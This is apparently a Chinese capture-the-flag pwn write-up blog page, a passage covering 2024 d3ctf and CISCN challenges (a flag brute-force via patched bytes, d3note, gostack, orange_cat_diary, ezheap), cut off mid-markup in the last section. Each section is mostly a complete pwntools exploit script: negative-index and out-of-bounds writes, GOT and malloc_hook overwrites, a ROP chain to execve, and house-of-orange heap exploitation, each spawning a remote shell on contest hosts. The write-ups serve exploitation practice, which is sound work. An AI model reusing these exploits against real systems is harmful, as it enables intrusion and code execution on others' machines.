<p>即输入数字时，会先判断符号，所以可以将<code>+</code>修改为某个标志符，根据下次输入的程序的运行来判断爆破是否正确。对应反汇编为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000068BFA 83 E8 2B                      sub     eax, 2Bh ; &#x27;+&#x27;</span><br><span class="line">.text:0000000000068BFD 49 8D 57 01                   lea     rdx, [r15+1]</span><br><span class="line">.text:0000000000068C01 83 E0 FD                      and     eax, 0FFFFFFFDh</span><br><span class="line">.text:0000000000068C04 75 63                         jnz     short loc_68C69</span><br></pre></td></tr></table></figure>
<p>然后只需将sub eax,2Bh中的2B改为对应的标志符即可</p>
<p>但是修改后，仍然无法判断，可以对比修改前的程序和修改后的程序同时运行，发现_strtoull_internal函数运行前后返回值不同，发现修改函数中符号判断位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.text:0000000000054686 C7 44 24 1C 00 00 00 00       mov     [rsp+58h+var_3C], 0</span><br><span class="line">.text:000000000005468E 41 80 FF 2B                   cmp     r15b, 2Bh ; &#x27;+&#x27;</span><br><span class="line">.text:0000000000054692 0F 84 78 01 00 00             jz      loc_54810</span><br></pre></td></tr></table></figure>
<p>修改完这两个位置后，就可以对接下来的输入进行判断了</p>
<p>1.如果猜测标志字符是字母，请输入 ?1 代表 %lu，如果 ?是对应的字符，则等待%u的输入，如果没有则直接退出。</p>
<p>2.如果您猜测标志字符是数字，请输入？对于 %lu，如果 ?是对应的数字，则直接退出，如果不是，则等待%u。</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;d3ctf&#123;[a-f0-9]&#123;&#x27;</span>)</span><br><span class="line">n = <span class="built_in">int</span>(io.recv(<span class="number">2</span>))</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess</span>(<span class="params">c, offset</span>):</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    <span class="comment">#io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">    io = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#attach(io, &#x27;b write_mem&#x27;)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">    code_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;-&#x27;</span>, <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&#125;&#125;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    loc = <span class="number">0x68bfa</span> + <span class="number">2</span> - <span class="number">0x26000</span> + code_base</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(loc).encode())</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(offset).encode())</span><br><span class="line"></span><br><span class="line">    loc = <span class="number">0x5468e</span> + <span class="number">3</span> - <span class="number">0x26000</span> + code_base</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(loc).encode())        </span><br><span class="line">    io.sendline(<span class="built_in">str</span>(offset).encode())            </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> nums:</span><br><span class="line">        io.sendline(c.encode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(c.encode()+<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;abcdef&quot;</span></span><br><span class="line">nums = <span class="string">&quot;1234567890&quot;</span></span><br><span class="line">flag = <span class="string">&quot;d3ctf&#123;&quot;</span></span><br><span class="line"></span><br><span class="line">sign = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">6</span>+n):</span><br><span class="line">    sign = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        guess(c, i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io.recv(timeout=<span class="number">0.2</span>)</span><br><span class="line">            flag += c</span><br><span class="line">            sign = <span class="number">1</span></span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> sign:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> nums:</span><br><span class="line">        guess(c, i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io.recv(timeout=<span class="number">0.2</span>)</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += c</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag) </span><br><span class="line"></span><br><span class="line">flag = flag + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>个人认为官方这个解法反而不太好想到了</p>
<h1 id="2024d3ctf-d3note"><a href="#2024d3ctf-d3note" class="headerlink" title="2024d3ctf-d3note"></a>2024d3ctf-d3note</h1><p><strong>标签:负数溢出</strong></p>
<p>负数溢出,然后虚拟内存空间中存在一块存放了一些介质信息的rw内存块</p>
<p>其他没啥好说的,直接改got表就是了</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">	<span class="keyword">if</span>(script):</span><br><span class="line">		gdb.attach(p, script)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line">		pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		<span class="keyword">return</span> process(elf_path)</span><br><span class="line">	<span class="keyword">return</span> remote(<span class="string">&#x27;139.224.62.61&#x27;</span>,<span class="number">32273</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	sl(<span class="string">b&#x27;1300&#x27;</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	sl(tbs(idx))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">	sl(<span class="string">b&#x27;2064&#x27;</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	sl(tbs(idx))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	sl(content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">	sl(<span class="string">b&#x27;276&#x27;</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	sl(tbs(idx))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	sl(tbs(size))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	sl(content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	sl(<span class="string">b&#x27;6425&#x27;</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	sl(tbs(idx))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">24</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(-<span class="number">1460</span>)</span><br><span class="line">libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">edit(-<span class="number">1438</span>,p32(<span class="number">0x404000</span>))</span><br><span class="line"></span><br><span class="line">edit(-<span class="number">1477</span>,p64(system))</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<h1 id="2024ciscn-gostack"><a href="#2024ciscn-gostack" class="headerlink" title="2024ciscn-gostack"></a>2024ciscn-gostack</h1><p>cgo栈溢出题,没啥好说的,</p>
<p>唯一需要注意的就是需要修复栈上变量</p>
<p><strong>exp</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./gostack&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.37-0ubuntu2_amd64/libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">ra  =<span class="keyword">lambda</span> time=<span class="number">0.5</span>				:p.recvall(timeout=time)</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">	<span class="keyword">if</span>(script):</span><br><span class="line">		gdb.attach(p, script)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line">		pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		<span class="keyword">return</span> process(elf_path)</span><br><span class="line">	<span class="keyword">return</span> remote(<span class="string">&#x27;8.147.131.196&#x27;</span>,<span class="number">38305</span>)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">syscall=p64(<span class="number">0x4616c9</span>)</span><br><span class="line">pop_rax=p64(<span class="number">0x40f984</span>)<span class="comment"># pop rax; ret; </span></span><br><span class="line">pop_rsi=p64(<span class="number">0x42138a</span>)<span class="comment">#pop rsi; ret;</span></span><br><span class="line">pop_rdx=p64(<span class="number">0x4944ec</span>)<span class="comment">#pop rdx; ret; </span></span><br><span class="line">mov_rdi_rdx=p64(<span class="number">0x4142f0</span>)<span class="comment">#mov rdi, rdx; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret; </span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">256</span>+p64(<span class="number">0x5401a0</span>)+p64(<span class="number">1000</span>)+p64(<span class="number">1000</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">184</span></span><br><span class="line">payload+=pop_rsi+p64(<span class="number">0x5491a0</span>)+pop_rdx+p64(<span class="number">0</span>)+mov_rdi_rdx+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload+=pop_rdx+p64(<span class="number">16</span>)+pop_rax+p64(<span class="number">0</span>)+syscall</span><br><span class="line">payload+=pop_rsi+p64(<span class="number">0</span>)+pop_rdx+p64(<span class="number">0x5491a0</span>)+mov_rdi_rdx+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload+=pop_rdx+p64(<span class="number">0</span>)+pop_rax+p64(<span class="number">0x3b</span>)+syscall+p64(<span class="number">0x6666</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Input your magic message :&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<h1 id="2024ciscn-orange-cat-diary"><a href="#2024ciscn-orange-cat-diary" class="headerlink" title="2024ciscn-orange_cat_diary"></a>2024ciscn-orange_cat_diary</h1><p>有一个越界写7个字节,先house_of_organe然后直接修改malloc_hook就是了</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./orange_cat_diary&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">ra  =<span class="keyword">lambda</span> time=<span class="number">0.5</span>				:p.recvall(timeout=time)</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">	<span class="keyword">if</span>(script):</span><br><span class="line">		gdb.attach(p, script)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line">		pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		<span class="keyword">return</span> process(elf_path)</span><br><span class="line">	<span class="keyword">return</span> remote(<span class="string">&#x27;8.147.131.163&#x27;</span>,<span class="number">36115</span>)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cho</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Please input your choice:&#x27;</span>,tbs(cho))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;length of the diary content:&#x27;</span>,tbs(size))</span><br><span class="line">	sa(<span class="string">b&#x27;Please enter the diary content:&#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content</span>):</span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input the length of the diary content:&#x27;</span>,tbs(size))</span><br><span class="line">	sa(<span class="string">b&#x27;enter the diary content:&#x27;</span>,content)<span class="comment">#more 7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;tell me your name.&#x27;</span>,<span class="string">b&#x27;ixout&#x27;</span>)</span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">b&#x27;aaaaaa&#x27;</span>)</span><br><span class="line">edit(<span class="number">0x1fb</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f8</span>+<span class="string">b&#x27;\x01\x0e\0&#x27;</span>)</span><br><span class="line">add(<span class="number">0xe00</span>,<span class="string">b&#x27;abbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c5100</span></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;ddd&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">fake=libc.address+<span class="number">0x3C4AED</span></span><br><span class="line">one=libc.address+<span class="number">0xf03a4</span></span><br><span class="line">edit(<span class="number">0x20</span>,p64(fake))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x13</span>+p64(one))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">b&#x27;length of the diary content:&#x27;</span>,tbs(<span class="number">30</span>))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<h1 id="2024ciscn-ezheap"><a href="#2024ciscn-ezheap" class="headerlink" title="2024ciscn-ezheap"></a>2024ciscn-ezheap</h1><p>同样是越界写,fsop即可</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 